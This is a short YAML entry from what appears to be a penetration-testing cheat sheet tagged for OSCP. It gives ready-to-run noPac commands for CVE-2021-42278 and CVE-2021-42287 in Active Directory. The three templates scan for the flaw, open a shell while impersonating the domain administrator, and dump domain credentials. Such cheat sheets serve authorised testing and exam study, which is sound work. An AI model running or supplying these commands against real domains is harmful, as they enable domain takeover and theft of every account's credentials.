---
variants:
  - label: scan
    command: |
      scanner-noPac.py $DOMAIN/$USER:$PASSWORD -dc-ip $DCIP -use-ldap
  - label: shell
    command: |
      noPac.py $DOMAIN/$USER:$PASSWORD -dc-ip $DCIP -dc-host $DC -shell --impersonate administrator -use-ldap
  - label: dump
    command: |
      noPac.py $DOMAIN/$USER:$PASSWORD -dc-ip $DCIP -dc-host $DC --impersonate administrator -use-ldap -dump
description: Check for and exploit CVE-2021-42278 and CVE-2021-42287 to impersonate a domain admin
os: [Linux]
category: [oscp, cli]
service: [Kerberos, AD]
phase: [PrivEsc]
references:
  - https://github.com/Ridter/noPac
---
